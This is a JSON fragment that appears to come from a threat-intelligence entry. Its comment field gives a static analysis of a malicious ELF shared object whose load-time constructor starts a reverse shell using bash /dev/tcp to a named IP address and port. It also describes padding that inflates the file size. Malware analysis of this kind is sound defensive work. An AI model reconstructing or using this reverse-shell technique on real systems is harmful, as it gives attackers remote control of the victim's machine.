        "twitter_handle": null,
        "display_name": null,
        "comment": "Static review, 2026-10-25 UTC. Despite clean/legit verdicts from several engines, this is a malicious ELF64 x86-64 shared object (1,036,800 bytes). The real object is ~12.8 KB: 0x75 bytes of .text run from .init_array (a load-time constructor) and pass a plaintext .rodata command to /bin/sh: setsid bash with exec 0\u003c\u003e/dev/tcp/85.11.167.7/15077, i.e. an interactive reverse shell (PTY via script -qc). The file is then three identical copies of the object separated by ~331,736-byte runs of 0x80 padding, inflating size (overall entropy ~0.27). Built with GCC 11.4.0 (Ubuntu 22.04). Fits LD_PRELOAD/library-injection use. Endpoint matches ThreatFox 1984360. Not executed; endpoint not contacted."
      }
